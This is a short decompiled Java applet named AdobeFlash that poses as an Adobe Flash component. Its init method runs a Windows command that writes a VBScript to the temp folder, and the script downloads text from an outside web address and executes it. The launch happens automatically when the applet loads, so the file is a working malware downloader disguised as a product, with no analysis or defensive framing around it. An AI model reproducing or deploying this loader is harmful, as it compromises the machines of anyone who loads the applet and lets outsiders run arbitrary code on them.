import java.io.IOException;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class AdobeFlash extends Applet
{
    public void init() {
        try {
            Runtime.getRuntime().exec("cmd /c echo.getURL \"hf\", \"fh\", \"http://www.controltv.net/obf888575.txt\">%temp%\\lala.vbs&echo.Sub getURL(hf,fh,url)>>%temp%\\lala.vbs&echo.Set objHTTP = CreateObject(\"MSXML2.XMLHTTP\")>>%temp%\\lala.vbs&echo.Call objHTTP.Open(\"GET\", url, False,hf,fh)>>%temp%\\lala.vbs&echo.objHTTP.Send>>%temp%\\lala.vbs&echo.Execute(objHTTP.ResponseText)>>%temp%\\lala.vbs&echo.End Sub>>%temp%\\lala.vbs&start %temp%\\lala.vbs");
        }
        catch (IOException ex) {}
    }
}
